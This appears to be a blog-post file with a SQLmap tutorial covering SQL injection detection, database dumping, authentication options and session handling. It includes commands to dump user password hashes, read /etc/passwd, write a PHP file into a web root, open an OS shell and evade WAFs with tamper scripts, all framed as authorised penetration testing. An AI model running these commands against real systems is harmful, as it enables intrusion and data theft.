@@ -1,0 +1,242 @@
+---
+title: "SQLmap Tutorial: From Detection to Dumping"
+date: "2026-05-20"
+description: "A working SQLmap tutorial for confirming and exploiting SQL injection — the flags, the workflow, and the common pitfalls."
+author: "VulnScanners team"
+tags: ["sqlmap", "sql-injection", "tutorial"]
+---
+
+SQLmap is the de-facto tool for confirming SQL injection. Pointing it at the wrong target or running it with default aggression is also the easiest way to break a production database, so the difference between "ran the demo" and "used SQLmap effectively" matters.
+
+This is the workflow, the flags worth knowing, and the gotchas that bite first-timers.
+
+## TL;DR
+
+- SQLmap automates the boring half of SQLi exploitation (boolean blind, time-based blind, error-based, UNION, stacked queries).
+- Always start with `--batch --level=1 --risk=1`. Crank up only when needed.
+- Use `-u` for URL params, `-r` for full HTTP requests (especially with auth).
+- Never run against assets you don't have explicit written permission to test. SQLmap is loud and destructive on real production data.
+
+## Legal preamble
+
+This tool is for authorised security testing only. Running SQLmap against a target you don't own or don't have explicit permission to test is a crime in most jurisdictions. Use your own apps, intentionally-vulnerable test apps (DVWA, OWASP Juice Shop, sqli-labs), or assets covered by a written engagement.
+
+## Install
+
+```bash
+# Most package managers ship it
+brew install sqlmap                              # macOS
+sudo apt install sqlmap                          # Debian / Ubuntu
+
+# Or clone — guarantees latest
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap && python3 sqlmap.py --version
+```
+
+The git checkout is what most pentesters use because the project moves fast and apt repos lag.
+
+## The minimal first run
+
+Against a known-vulnerable lab target with a query string parameter:
+
+```bash
+sqlmap -u "http://target.local/products.php?id=1" --batch
+```
+
+What SQLmap does:
+
+1. Tests `id` for various injection techniques (boolean blind, time-based, error-based, UNION-based).
+2. Identifies the DBMS (MySQL, PostgreSQL, MSSQL, etc.).
+3. Reports which techniques worked.
+
+`--batch` accepts SQLmap's default answers to every prompt. Without it you'll be hitting enter constantly.
+
+## Levels and risks
+
+Two flags control how aggressive SQLmap is:
+
+- **`--level=1..5`** — how many places to inject (default 1: query string only; 5: also tests cookies, headers, custom positions)
+- **`--risk=1..3`** — how risky the test payloads are (default 1; 3 includes payloads that can modify data)
+
+```bash
+sqlmap -u "..." --level=3 --risk=2 --batch
+```
+
+Realistic guidance: start at `--level=1 --risk=1`. If nothing turns up and the param really looks vulnerable, escalate to `--level=3 --risk=2`. Avoid `--risk=3` unless you're scanning a target you fully control — it includes payloads that can corrupt data.
+
+## Authentication
+
+For anything past the public homepage, you'll need auth. Three options:
+
+**Cookie:**
+
+```bash
+sqlmap -u "http://target/profile?id=5" --cookie="session=eyJhbGciOi..." --batch
+```
+
+**Saved HTTP request (the cleanest option):**
+
+Capture a request in Burp / ZAP and save it to a file:
+
+```
+POST /api/v1/search HTTP/1.1
+Host: target.example.com
+Cookie: session=eyJhbGciOi...
+Content-Type: application/json
+
+{"q":"laptop"}
+```
+
+Then:
+
+```bash
+sqlmap -r request.txt --batch
+```
+
+SQLmap parses the request file, identifies injectable parameters, and tests them with the auth context preserved. This is the workflow you'll use most often in real engagements.
+
+**Login flow:**
+
+```bash
+sqlmap -u "http://target/search?q=test" \
+  --auth-type=basic --auth-cred="user:pass" --batch
+```
+
+For form-based login you'll need to capture the post-login session and use `--cookie` or `-r`.
+
+## Targeting specific parameters
+
+By default SQLmap tests every parameter it finds. Narrow it:
+
+```bash
+sqlmap -r request.txt -p "search,id" --batch
+```
+
+For JSON requests, point at the field with `--data` and `--method`:
+
+```bash
+sqlmap -u "http://target/api/search" --method=POST \
+  --data='{"q":"laptop"}' --headers='Content-Type: application/json' \
+  --batch
+```
+
+For deeply-nested JSON, mark the test point with `*`:
+
+```bash
+sqlmap -u "http://target/api/search" --method=POST \
+  --data='{"filter":{"name":"laptop*"}}' --batch
+```
+
+The `*` tells SQLmap "inject here specifically".
+
+## After confirmation: extraction
+
+Once SQLmap confirms an injection, you walk down the database:
+
+```bash
+# 1. List databases
+sqlmap -r request.txt --batch --dbs
+
+# 2. Show tables in a database
+sqlmap -r request.txt --batch -D production --tables
+
+# 3. Show columns in a table
+sqlmap -r request.txt --batch -D production -T users --columns
+
+# 4. Dump specific columns
+sqlmap -r request.txt --batch -D production -T users -C email,password_hash --dump
+
+# 5. Dump the whole table
+sqlmap -r request.txt --batch -D production -T users --dump
+```
+
+Use `--dump-all` only as a last resort. It can take hours and writes a lot of disk.
+
+## OS-level interaction
+
+Once SQLmap has confirmed deep enough access (often `--risk=3` or a stacked-queries injection on MSSQL/MySQL):
+
+```bash
+# Read a file from the DB server's filesystem (DB user must have privileges)
+sqlmap -r request.txt --batch --file-read=/etc/passwd
+
+# Write a file
+sqlmap -r request.txt --batch --file-write=local.php --file-dest=/var/www/uploaded.php
+
+# Get an OS shell (if stacked queries / xp_cmdshell etc. are available)
+sqlmap -r request.txt --batch --os-shell
+```
+
+These are the "this is now an active engagement" features. Make sure your scope explicitly covers them.
+
+## Useful auxiliary flags
+
+```bash
+--current-db                # which database is the app using?
+--current-user              # which DB user?
+--is-dba                    # is the user a DBA?
+--privileges                # what can it do?
+--passwords                 # dump DBMS hashes
+--threads=10                # parallel requests (default 1, max 10)
+--random-agent              # randomise User-Agent per request
+--proxy=http://127.0.0.1:8080   # route through Burp / ZAP for inspection
+--delay=0.5                 # sleep between requests (rate limiting)
+--timeout=30                # request timeout
+--retries=3                 # retries on timeout
+--tamper=between,space2comment   # apply tamper scripts for WAF evasion
+```
+
+`--proxy=http://127.0.0.1:8080` is especially useful — you can watch SQLmap's traffic in Burp / ZAP to understand what payloads it's sending and confirm your filter / WAF is behaving as expected.
+
+## Tamper scripts and WAFs
+
+Out of the box, SQLmap's payloads will be flagged by most WAFs. Tamper scripts mutate payloads to evade common signatures:
+
+```bash
+sqlmap -u "..." --tamper=space2comment,charencode --batch
+```
+
+Useful tampers:
+
+| Tamper | What it does |
+|--------|--------------|
+| `space2comment` | Replaces spaces with `/**/` |
+| `charencode` | URL-encodes characters |
+| `between` | Replaces `=` with `BETWEEN ... AND ...` |
+| `randomcase` | Randomises case across the payload |
+| `concat2concatws` | Replaces `CONCAT()` with `CONCAT_WS()` |
+| `apostrophenullencode` | Encodes single quotes with `%00%27` |
+
+The full list is in `sqlmap --list-tampers`. Chain them with commas; order matters.
+
+## Working with sessions
+
+SQLmap caches results in `~/.sqlmap/output/<host>/`. Subsequent runs against the same target resume rather than restart.
+
+```bash
+sqlmap -u "..." --flush-session --batch   # start fresh
+sqlmap -u "..." --output-dir=./sqlmap-out --batch
+```
+
+When working on a real engagement, set `--output-dir` to a project-specific folder. The default `~/.sqlmap` directory becomes unwieldy across many targets.
+
+## Common pitfalls
+
+- **Running at `--risk=3` against production.** Some payloads change data. Use risk 1 for first confirmation; escalate deliberately.
+- **Treating `--batch` as "safe".** It just accepts defaults — those defaults still send invasive payloads.
+- **Ignoring the DBMS hint and letting SQLmap test all of them.** Specify `--dbms=mysql` (or whatever you know it is) to skip irrelevant probes.
+- **Not using `-r` for authenticated requests.** Manually specifying cookies / headers is error-prone; saved request files preserve everything.
+- **`--threads=10` against a fragile target.** Concurrency can take down weak backends.
+- **Forgetting `--proxy=` when you need to inspect.** Running SQLmap blind to a WAF without watching the requests in Burp wastes time.
+
+## When SQLmap is the wrong tool
+
+- **Pre-confirmation reconnaissance.** Use a DAST tool like [OWASP ZAP](/scanners/zap) or [Nuclei](/scanners/nuclei) to find candidate injection points first. SQLmap is then used to confirm and exploit specific findings.
+- **NoSQL injection.** SQLmap is, despite the name, SQL only. NoSQL injection in MongoDB, etc., needs different tooling.
+- **Second-order / stored injection.** SQLmap mostly tests the immediate request; it can't follow a value that's injected into one endpoint and triggered later by another.
+
+## Further reading
+
+- SQLmap wiki — [github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+- DVWA (legal practice target) — [github.com/digininja/DVWA](https://github.com/digininja/DVWA)
+- Our ZAP guide — [active vs passive scanning explained](/blog/owasp-zap-active-vs-passive-scan)
